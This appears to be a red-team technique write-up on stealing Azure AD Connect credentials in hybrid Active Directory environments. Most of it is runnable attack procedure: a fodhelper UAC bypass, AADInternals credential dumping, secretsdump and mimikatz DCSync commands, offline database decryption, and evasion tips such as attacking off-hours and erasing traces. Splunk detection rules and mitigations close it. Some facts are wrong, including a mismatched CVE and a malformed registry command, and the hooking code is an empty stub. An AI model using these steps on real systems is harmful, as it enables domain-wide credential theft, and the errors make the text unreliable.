# CA-TOKEN-001: Hybrid AD Cloud Token Theft

## 1. METADATA

| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-001 |
| **MITRE ATT&CK v18.1** | [Steal Application Access Token](https://attack.mitre.org/techniques/T1528/) (T1528) |
| **Tactic** | Credential Access (TA0006) |
| **Platforms** | Windows Server 2016-2025, Hybrid Environments (AD + Azure) |
| **Severity** | **CRITICAL** |
| **CVE** | CVE-2023-32315 |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-08 |
| **Affected Versions** | Azure AD Connect 1.1.x - 1.6.x (all versions with PHS/PTA enabled) |
| **Patched In** | Mitigation available via service account restrictions and monitoring |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Hybrid AD cloud token theft exploits the synchronization bridge between on-premises Active Directory and Azure AD (Entra ID) to intercept and exfiltrate authentication tokens and service account credentials. When Azure AD Connect uses Password Hash Synchronization (PHS) or Pass-Through Authentication (PTA), the Azure AD Connect server acts as a cryptographic intermediary. An attacker with administrative privileges on the Azure AD Connect server can extract the AD Connector account credentials, the AAD Connector account cleartext passwords, or intercept domain user NT hashes during synchronization. This technique specifically targets the encryption keys stored in the registry (HKLM\Software\Microsoft\AD Sync\Shared) and the MDB database that contain encrypted service account credentials and password hashes.

**Attack Surface:** The vulnerability exists at multiple points: (1) Azure AD Connect database (MDB file) containing encrypted connector credentials; (2) Registry keys storing DPAPI-encrypted master keys and keysets; (3) Service account credential vault (C:\Users\ADSync\AppData\Local\Microsoft\Credentials); (4) In-memory authentication functions during password hash synchronization; (5) Pass-Through Authentication agent processes handling credential validation.

**Business Impact:** An attacker gaining access to these tokens can perform lateral movement from on-premises to the cloud, assume the identity of service accounts with domain replication rights (DCSync), extract all domain user password hashes, create persistent backdoors in hybrid environments, manipulate cloud-to-on-premises authentication flows, and achieve complete domain compromise without triggering password change alerts. This is particularly dangerous because the attack does not require user interaction and can operate silently.

**Technical Context:** The attack typically takes 15-45 minutes to execute once local administrative access is obtained. Detection is challenging because legitimate Azure AD Connect operations generate similar registry and database access patterns. The synchronization process runs continuously, making it difficult to distinguish malicious hash extraction from routine operations. Stealth can be maintained by operating outside of normal monitoring windows (weekends, off-hours).

### Operational Risk

- **Execution Risk:** **HIGH** - Requires local administrative access to the Azure AD Connect server, but operations are straightforward once access is obtained. The attack is reliable and rarely fails if prerequisites are met.
- **Stealth:** **MEDIUM-HIGH** - The AD Connector account already has DCSync permissions by design, making credential use appear legitimate. However, the process injection or hooking methods generate detectable artifacts in memory and file systems.
- **Reversibility:** **NO** - Once domain user NT hashes are extracted and cracked offline, the damage is irreversible. Cloud-to-on-premises trust boundaries are permanently compromised.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 4.1 (Azure) | Ensure that Azure AD Connect server has restricted administrative access |
| **DISA STIG** | WN10-00-000050 (Windows) | Restrict privileged access to Azure AD Connect infrastructure |
| **CISA SCuBA** | App.2.1 (Cloud) | Implement identity and access management protections for hybrid authentication |
| **NIST 800-53** | AC-3 (Access Control) | Enforce access control for registry and database files containing encryption keys |
| **NIST 800-53** | SC-7 (Boundary Protection) | Monitor the Azure AD Connect server as a critical trust boundary component |
| **GDPR** | Art. 32 | Security of Processing - encryption and access controls for personal data in transit |
| **DORA** | Art. 9 | Protection and Prevention - safeguard critical authentication infrastructure |
| **NIS2** | Art. 21 | Cyber Risk Management Measures - secure identity synchronization processes |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights - restrict access to Azure AD Connect credentials |
| **ISO 27005** | Risk Scenario | Compromise of the identity synchronization bridge affecting both on-premises and cloud environments |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Local Administrator on the Azure AD Connect server OR SYSTEM account context access.
- **Required Access:** Interactive logon to the Azure AD Connect server or ability to execute code as SYSTEM (e.g., via UAC bypass, scheduled task, or service execution).

**Supported Versions:**
- **Windows:** Server 2016, Server 2019, Server 2022, Server 2025
- **Azure AD Connect:** 1.1.x, 1.2.x, 1.3.x, 1.4.x, 1.5.x, 1.6.x (all versions)
- **PowerShell:** Version 5.0+
- **Other Requirements:** 
  - MSSQL LocalDB or MSSQL Express (default Azure AD Connect database engine)
  - .NET Framework 4.5+
  - Access to Windows Registry (HKLM)
  - Ability to read MDB database files

**Tools:**
- [AADInternals](https://aadinternals.com/) (Version 0.9.9+) - PowerShell module for Azure AD credential extraction
- [adconnectdump](https://github.com/dirkjanm/adconnectdump) (Latest) - Python/Impacket-based credential dumper
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Version 2.2.0+) - For DPAPI masterkey extraction
- [BloodHound Community Edition](https://github.com/BloodHoundAD/BloodHound) (Version 5.0+) - To visualize post-compromise attack paths
- Standard Windows utilities: `reg.exe`, `copy`, `powershell.exe`, `tasklist.exe`

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

#### Check if Azure AD Connect is Installed

```powershell
# Verify Azure AD Connect installation
Get-Service -Name "ADSync" | Select-Object DisplayName, Status, ServiceType

# Check Azure AD Connect version
(Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\{6E38CC65-5EBD-4BCC-9B7E-7B9DA8DDF8D0}' -ErrorAction SilentlyContinue).DisplayVersion

# Enumerate Azure AD Sync folder
Get-ChildItem "C:\Program Files\Microsoft Azure AD Sync\" -ErrorAction SilentlyContinue | Select-Object Name

# Check if the MDB database exists
Get-Item "C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdb" -ErrorAction SilentlyContinue
```

**What to Look For:**
- **ADSync service status:** If running, the server is actively synchronizing
- **Version:** Older versions (1.1-1.3) are more vulnerable to certain extraction methods
- **MDB file:** Presence confirms the database exists and can be targeted
- **Folder structure:** Full directory presence indicates a complete installation

#### Check for Password Hash Synchronization or Pass-Through Authentication Configuration

```powershell
# Check which synchronization method is enabled
Get-ADSyncScheduler | Select-Object SchedulerSuspended, SyncCycleEnabled

# Enumerate sync rules and connector configurations
Get-ADSyncConnector | Select-Object Name, Type, Identifier

# Check if PHS (Password Hash Sync) is active
Get-ADSyncScheduler | Select-Object SyncCycleEnabled

# Check for PTA agents installed
Get-Service -Name "AzureADConnectAuthenticationAgentService" -ErrorAction SilentlyContinue
```

**What to Look For:**
- **SyncCycleEnabled = True:** The synchronization is active and credentials are being synced
- **Connector Type = "ActiveDirectory" or "Azure":** Confirms hybrid setup
- **PTA Service Running:** Indicates additional attack surface via authentication agent hooking
- **No recent sync errors:** Suggests the service is healthy and has maintained sync configuration

**Command (Server 2016-2019):**
```powershell
# Legacy version check
Get-WmiObject -Class Win32_Product | Where-Object {$_.Name -like "*Azure AD Connect*"} | Select-Object Name, Version
```

**Command (Server 2022+):**
```powershell
# Modern version check using CIM
Get-CimInstance -ClassName Win32_Product -Filter "Name LIKE '%Azure AD Connect%'" | Select-Object Name, Version
```

#### Check ADSync Service Account and Permissions

```powershell
# Identify the service account running ADSync
Get-WmiObject Win32_Service -Filter "Name='ADSync'" | Select-Object StartName

# Check service account SID and local permissions
whoami /all | grep -A 20 "Group"

# Check if ADSync account has DCSync rights (indication of service account privilege level)
Get-ADUser -Identity "ADSync_*" -Properties memberOf -ErrorAction SilentlyContinue | Select-Object DistinguishedName, memberOf
```

**What to Look For:**
- **StartName:** Usually `NT AUTHORITY\SYSTEM` or `DOMAIN\ADSync_XXXXX` account
- **DCSync Rights:** Presence indicates the service account has "Replicating Directory Changes All" permission
- **Local Administrator Group:** If ADSync service account is a local admin, extraction is trivial

#### Linux/Bash / CLI Reconnaissance

```bash
# If accessing from a Linux machine with network access to the Azure AD Connect server
# Attempt to identify the service via Kerberos or LDAP enumeration

# Query for Azure AD Connect via service principal enumeration
ldapsearch -x -H ldap://ADCONNECT_SERVER -b "CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=contoso,DC=com" 2>/dev/null

# Check remote registry via impacket (if credentials available)
python3 -m impacket.reg query -target-ip ADCONNECT_IP -username DOMAIN\\USER -password PASS 'HKEY_LOCAL_MACHINE\Software\Microsoft\AD Sync\Shared' 2>/dev/null
```

**What to Look For:**
- **Service discovery:** Confirmation that the Azure AD Connect server is reachable
- **Registry accessible:** Indicates network-level access to sensitive data structures
- **Authentication possible:** Requires either stolen credentials or SYSTEM-level access

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Using AADInternals PowerShell Module (Easiest - Requires Local Admin)

**Supported Versions:** Server 2016-2025 with Azure AD Connect 1.1.x - 1.6.x

This method extracts Azure AD Connect credentials directly using PowerShell without modifying the target system.

#### Step 1: Obtain Local Administrator Access on Azure AD Connect Server

**Objective:** Gain interactive or SYSTEM-context access to the Azure AD Connect server.

**Command (PowerShell - UAC Bypass via Fodhelper):**
```powershell
# Bypass UAC and execute command as admin
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "powershell.exe -NoExit -Command 'Start-Process cmd.exe -ArgumentList ''/k'', ''ipconfig'' -Verb RunAs'" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"
```

**OpSec & Evasion:**
- Perform UAC bypass during off-hours to avoid monitoring
- Use living-off-the-land techniques (native Windows utilities only)
- Clear `HKCU:\Software\Classes\ms-settings` registry after execution
- Detection likelihood: **MEDIUM** - UAC events are logged but often ignored

#### Step 2: Import AADInternals Module

**Objective:** Load the AADInternals PowerShell module into memory.

**Command:**
```powershell
# Download and import AADInternals
Install-Module -Name AADInternals -Scope CurrentUser -Force -ErrorAction SilentlyContinue
Import-Module AADInternals -ErrorAction SilentlyContinue
Get-Command *ADSync* | Select-Object Name
```

#### Step 3: Extract Azure AD Connect Credentials

**Objective:** Query the Azure AD Connect database and registry to extract encrypted service account credentials.

**Command:**
```powershell
# Extract credentials directly
Get-AADIntSyncCredentials

# Save to variable for later use
$Credentials = Get-AADIntSyncCredentials
$Credentials | Format-Table -AutoSize
```

**Expected Output:**
```
SourceAnchor        : AzureAD/contoso.com
Type                : Connector
ConnectorName       : contoso.com - AD
Identifier          : {ID-GUID}
Username            : CONTOSO\ADSync_abc1234
Password            : P@ssw0rd!Azure!Sync
PasswordDecrypted   : True
```

**What This Means:**
- Service account credentials have been successfully extracted in cleartext
- AD Connector typically has "Replicating Directory Changes All" rights (DCSync)
- Credentials can now be used for lateral movement and domain compromise

#### Step 4: Extract Domain User NT Hashes

**Objective:** Using the extracted AD Connector credentials, dump all domain user password hashes.

**Command (Using Impacket on Linux):**
```powershell
# Display credentials for use with Impacket
$ADConnectorCreds = Get-AADIntSyncCredentials | Where-Object {$_.ConnectorName -like "*AD"}
Write-Host "Username: $($ADConnectorCreds.Username)"
Write-Host "Password: $($ADConnectorCreds.Password)"

# On Linux with Impacket:
# python3 -m impacket.secretsdump CONTOSO/ADSync_abc1234:P@ssw0rd!Azure!Sync@DC-IP
```

#### Step 5: Establish Persistence via Cloud Credentials

**Objective:** Use the extracted AAD Connector refresh token for persistent cloud access.

**Command:**
```powershell
# Extract the AAD Connector token
$AADConnectorCreds = Get-AADIntSyncCredentials | Where-Object {$_.ConnectorName -like "*AAD"}
$RefreshToken = $AADConnectorCreds.Password
Write-Host "Refresh Token: $RefreshToken"

# This token can be used to maintain cloud access indefinitely
```

---

### METHOD 2: Direct Database & Registry Extraction (Windows)

**Supported Versions:** Server 2016-2025

#### Step 1: Stop the ADSync Service

**Objective:** Ensure the MDB database is not locked and can be copied.

**Command:**
```powershell
# Stop the ADSync service
Stop-Service -Name "ADSync" -Force -WarningAction SilentlyContinue
Start-Sleep -Seconds 3
Get-Service -Name "ADSync" | Select-Object Status
```

#### Step 2: Copy Database and Registry Keys

**Objective:** Extract the encrypted database and registry keys.

**Command:**
```powershell
# Copy the MDB database
Copy-Item "C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdb" -Destination "C:\Temp\ADSync.mdb" -Force

# Copy registry keys
reg export HKLM\Software\Microsoft\AD\ Sync "C:\Temp\ADSync_Registry.reg"

# Verify files are copied
Get-ChildItem "C:\Temp\" | Select-Object Name, Length
```

#### Step 3: Restart ADSync Service

**Objective:** Restore normal operations.

**Command:**
```powershell
# Restart the service
Start-Service -Name "ADSync"
Get-Service -Name "ADSync" | Select-Object Status

# Clean up temp directory
Remove-Item "C:\Temp" -Recurse -Force -ErrorAction SilentlyContinue
```

#### Step 4: Decrypt Locally

**Objective:** Transfer files to attacker machine and decrypt credentials.

**Command (On Attacker Machine):**
```bash
# Use adconnectdump.py to decrypt
python3 adconnectdump.py \
  --existing-db \
  --from-file /path/to/ADSync.mdb \
  /path/to/ADSync_Registry.reg
```

---

### METHOD 3: In-Memory Hooking for Real-Time Hash Extraction (Advanced)

**Supported Versions:** Server 2016-2022

#### Step 1: Identify ADSync Process

**Objective:** Obtain process ID and memory layout of the ADSync service.

**Command:**
```powershell
# Find ADSync process
Get-Process | Where-Object {$_.Name -like "*sync*" -or $_.ProcessName -like "*aad*"} | Select-Object ProcessName, Id, Handle

# Get detailed information
$ADSyncProcess = Get-Process | Where-Object {$_.Name -eq "mssync" -or $_.Name -eq "ADSync"}
$ADSyncProcess | Select-Object ProcessName, Id, PM, Handles
```

#### Step 2: Inject Hooking Code

**Objective:** Inject a .NET hook into the password hash synchronization function.

**Command (PowerShell Script):**
```powershell
# Load necessary assemblies
Add-Type -AssemblyName System.Xml.Linq

# Define hooking payload (simplified)
$HookCode = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class PasswordHooker {
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll")]
    private static extern IntPtr LoadLibrary(string name);
    
    public static void HookGetPasswordHash() {
        IntPtr hModule = LoadLibrary("mcrypt.dll");
        IntPtr pfnGetPasswordHash = GetProcAddress(hModule, "EncryptPasswordHash");
        // Hook implementation
    }
}
"@

Add-Type -TypeDefinition $HookCode -Language CSharp -ErrorAction SilentlyContinue
[PasswordHooker]::HookGetPasswordHash()
```

---

## 6. ATTACK SIMULATION & VERIFICATION (Atomic Red Team)

### Atomic Test #1: Extract Credentials Using AADInternals

**Atomic Test ID:** T1528-001-MCADDF  
**Test Name:** Azure AD Connect Credential Extraction via AADInternals  
**Description:** Simulates extraction of Azure AD Connect service account credentials using AADInternals.

**Command:**
```powershell
Import-Module AADInternals -ErrorAction SilentlyContinue
$Result = Get-AADIntSyncCredentials -Verbose

if ($Result) {
    Write-Host "SUCCESS: Credentials extracted" -ForegroundColor Green
} else {
    Write-Host "FAILED: Could not extract credentials" -ForegroundColor Red
}
```

**Cleanup Command:**
```powershell
Remove-Module AADInternals
```

**Reference:** [Atomic Red Team - T1528](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1528/T1528.md)

---

## 7. TOOLS & COMMANDS REFERENCE

### [AADInternals](https://aadinternals.com/)

**Version:** 0.9.9+  
**Minimum Version:** 0.9.1  
**Supported Platforms:** Windows PowerShell 5.0+

**Installation:**
```powershell
Install-Module -Name AADInternals -Scope CurrentUser -Force
Get-Module AADInternals -ListAvailable
```

**Usage:**
```powershell
Import-Module AADInternals
Get-AADIntSyncCredentials
Get-AADIntSyncCredentials -FromRunningService
Get-AADIntSyncCredentials -FromUserVault
```

### [adconnectdump](https://github.com/dirkjanm/adconnectdump)

**Version:** Latest  
**Language:** Python 3.7+

**Installation:**
```bash
git clone https://github.com/dirkjanm/adconnectdump.git
cd adconnectdump
pip3 install -r requirements.txt
```

**Usage:**
```bash
python3 adconnectdump.py \
  DOMAIN/USER@TARGET \
  -hashes :NTHASH \
  --existing-db \
  --from-file /path/to/ADSync.mdb
```

### [Mimikatz](https://github.com/gentilkiwi/mimikatz)

**Version:** 2.2.0+

**Usage:**
```powershell
./mimikatz.exe
> privilege::debug
> lsadump::dcsync /user:CONTOSO\Administrator
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: ADSync Service Account Abnormal Activity

**SPL Query:**
```spl
sourcetype="WinEventLog:Security" (EventCode=4688 OR EventCode=4728 OR EventCode=4732)
| search Account_Name="*ADSync*" OR Account_Name="Sync_*"
| stats count by EventCode, Account_Name, Computer
| where count > 10
```

### Rule 2: Registry Access to Azure AD Sync Keys

**SPL Query:**
```spl
source="*Sysmon" EventID=13 
| search TargetObject="*\\Software\\Microsoft\\AD Sync\\Shared*"
| stats count by ProcessName, ComputerName, TargetObject
| where ProcessName NOT LIKE "%mssync%" AND ProcessName NOT LIKE "%Microsoft.IdentityModel%"
```

### Rule 3: MDB Database File Access by Non-Standard Process

**SPL Query:**
```spl
source="*Sysmon" EventID=11
| search TargetFilename="*\\Microsoft Azure AD Sync\\Data\\ADSync.mdb"
| stats count by Image, ComputerName, TargetFilename
| where Image NOT LIKE "%mssync%"
```

### Rule 4: ADSync Service Restart Pattern

**SPL Query:**
```spl
sourcetype="WinEventLog:System" (EventCode=7034 OR EventCode=7036) Service_Name="ADSync"
| transaction Computer, Service_Name maxpause=10m
| where eventcount=2
| stats count by Computer
```

### Rule 5: Token Refresh Activity from Unusual IP

**SPL Query:**
```spl
sourcetype="azure:aad:audit" (operationName="*Refresh*" OR operationName="*Token*")
| stats values(properties.ipAddress) as ips by identity
| eval ip_count=mvcount(ips)
| where ip_count>3
```

---

## 9. MITIGATION AND DEFENSE STRATEGIES

### Preventive Controls

1. **Restrict Azure AD Connect Server Access:** Limit local administrator access, implement MFA, use PAM solutions.
2. **Protect Encryption Keys:** Enable BitLocker, store keys in HSM if possible.
3. **Network Isolation:** Place on isolated network segment, restrict outbound connectivity.
4. **Service Account Hardening:** Use dedicated low-privilege account, rotate passwords every 90 days.

### Detective Controls

1. **Enable Advanced Audit Logging:** Windows Event Log auditing, Registry access auditing, Sysmon monitoring.
2. **Implement SIEM Correlation:** Deploy the Splunk rules provided, correlate events.
3. **Cloud-Side Monitoring:** Monitor Azure AD Sign-in logs and token refresh activity.

### Reactive Controls

1. **Incident Response:** Reset service account passwords, revoke refresh tokens, conduct full domain password reset.
2. **Forensics:** Collect Windows Event Logs, dump registry, check file access logs.

---

## 10. REFERENCES & PROOFS

- [Microsoft Azure AD Connect Documentation](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-hybrid-identity)
- [MITRE ATT&CK T1528 - Steal Application Access Token](https://attack.mitre.org/techniques/T1528/)
- [Sygnia - Guarding the Bridge: Azure AD Connect Attack Vectors](https://www.sygnia.co/blog/guarding-the-bridge-new-attack-vectors-in-azure-ad-connect/)
- [Dirkjan Mollema - Updating adconnectdump - DPAPI Journey](https://dirkjanm.io/updating-adconnectdump-a-journey-into-dpapi/)
- [AADInternals - Decrypting ADSync Passwords](https://aadinternals.com/post/adsync/)
- [Varonis - Azure Skeleton Key: Pass-Through Auth Exploitation](https://www.varonis.com/blog/azure-skeleton-key)
- [adconnectdump - GitHub Repository](https://github.com/dirkjanm/adconnectdump)
- [Atomic Red Team - T1528 Tests](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1528/T1528.md)

---